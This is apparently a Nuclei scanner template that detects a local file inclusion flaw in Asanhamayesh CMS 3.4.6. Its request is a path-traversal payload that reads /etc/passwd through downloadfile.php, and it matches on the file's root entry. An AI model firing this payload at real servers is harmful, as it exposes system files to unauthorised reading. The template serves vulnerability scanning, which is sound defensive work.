http:
- matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/downloadfile.php?file=../../../../../../../../../../etc/passwd'
id: asanhamayesh-lfi
info:
  author: 0x_Akoko
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: Asanhamayesh CMS 3.4.6 is vulnerable to local file inclusion.
  metadata:
    max-request: 1
  name: Asanhamayesh CMS 3.4.6 - Local File Inclusion
  reference:
  - https://cxsecurity.com/issue/WLB-2018030006
  - https://asanhamayesh.com
  severity: high
  tags: asanhamayesh,lfi,traversal,vuln
